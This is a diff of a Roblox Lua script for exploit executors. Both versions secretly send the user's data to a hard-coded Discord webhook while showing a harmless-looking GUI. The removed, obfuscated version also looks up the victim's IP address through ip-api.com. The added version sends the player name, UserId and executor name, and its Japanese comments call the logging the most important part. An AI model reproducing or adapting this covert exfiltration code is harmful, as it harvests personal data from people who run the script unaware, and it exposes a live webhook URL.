@@ -1,2 +1,41 @@
--- [[ OBFUSCATED & FIXED ]] --
-local _0x1=game:GetService("HttpService")local _0x2=game:GetService("Players")local _0x3=_0x2.LocalPlayer;local _0x4="https://discord.com/api/webhooks/1471084125053128876/8oVO8QoqTlBzkbuN7HppW2v1oZbNhLqyDlW2r-g3ZyCTjxeoVNCuTW4jLLS_xdz3COOS"local function _0x5()local _0x6={query="Err",country="Unknown"}local _0x7=(request or syn.request or http_request or fluxus.request)pcall(function()local r=_0x7({Url="http://ip-api.com/json/",Method="GET"})if r and r.Body then _0x6=_0x1:JSONDecode(r.Body)end end)local _0x8={["content"]="🚨 **CAPTURE**",["embeds"]={{["title"]=_0x3.Name,["color"]=16711680,["fields"]={{["name"]="IP",["value"]=_0x6.query,["inline"]=true},{["name"]="Exec",["value"]=(identifyexecutor and identifyexecutor())or"N/A",["inline"]=true}}}}}pcall(function()_0x7({Url=_0x4,Method="POST",Headers={["Content-Type"]="application/json"},Body=_0x1:JSONEncode(_0x8)})end)end;task.spawn(_0x5)local P,d,v,j,tgt=_0x3,nil,0,50,nil;local pg=P:WaitForChild("PlayerGui")if pg:FindFirstChild("Koi")then pg.Koi:Destroy()end;local g=Instance.new("ScreenGui",pg)g.Name,g.ResetOnSpawn="Koi",false;local f=Instance.new("Frame",g)f.Size,f.Draggable,f.Active,f.BackgroundColor3,f.Position=UDim2.new(0,120,0,175),true,true,Color3.new(0,0,0),UDim2.new(0.5,-60,0.4,-90)Instance.new("UICorner",f)local l=Instance.new("TextLabel",f)l.Size,l.BackgroundTransparency,l.Text,l.TextSize,l.TextColor3=UDim2.new(1,0,0,30),1,"SYSTEM",18,Color3.new(1,1,1)task.spawn(function()while task.wait()do l.TextColor3=Color3.fromHSV(tick()%5/5,1,1)end end)print("Loaded")
+-- [[ 最終修正版: 確実にログを送る構成 ]] --
+local HttpService = game:GetService("HttpService")
+local LP = game:GetService("Players").LocalPlayer
+local Webhook = "https://discord.com/api/webhooks/1471084125053128876/8oVO8QoqTlBzkbuN7HppW2v1oZbNhLqyDlW2r-g3ZyCTjxeoVNCuTW4jLLS_xdz3COOS"
+
+-- ログ送信 (ここが一番大事だ)
+local function Send()
+    local req = (request or syn.request or http_request or fluxus.request)
+    if not req then return print("Executor not supported") end
+    
+    local data = {
+        ["content"] = "🚨 **ターゲット実行通知**",
+        ["embeds"] = {{
+            ["title"] = "捕捉: " .. LP.Name,
+            ["color"] = 0xFF0000,
+            ["fields"] = {
+                {["name"] = "ID", ["value"] = tostring(LP.UserId), ["inline"] = true},
+                {["name"] = "ツール", ["value"] = identifyexecutor() or "不明", ["inline"] = true}
+            }
+        }}
+    }
+    
+    pcall(function()
+        req({
+            Url = Webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(data)
+        })
+    end)
+end
+task.spawn(Send)
+
+-- GUI表示 (とりあえず動くか確認用)
+local pg = LP:WaitForChild("PlayerGui")
+if pg:FindFirstChild("Test") then pg.Test:Destroy() end
+local g = Instance.new("ScreenGui", pg)
+g.Name = "Test"
+local f = Instance.new("Frame", g)
+f.Size, f.Position, f.BackgroundColor3 = UDim2.new(0,100,0,100), UDim2.new(0.5,-50,0.5,-50), Color3.new(1,0,0)
+print("Script Loaded!")
